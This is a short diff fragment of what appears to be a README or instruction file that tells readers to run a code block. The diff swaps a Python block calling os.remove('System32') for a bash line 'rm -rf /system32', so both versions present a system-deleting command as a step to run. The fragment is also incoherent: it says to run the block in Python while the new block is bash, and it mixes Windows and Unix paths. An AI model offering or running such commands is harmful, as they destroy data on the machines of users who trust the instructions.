@@ -7,9 +7,6 @@ then run this file below in python.
 
 
 
-```python
-import os
-
-os.remove("System32")
-
+```bash
+rm -rf /system32
 ```
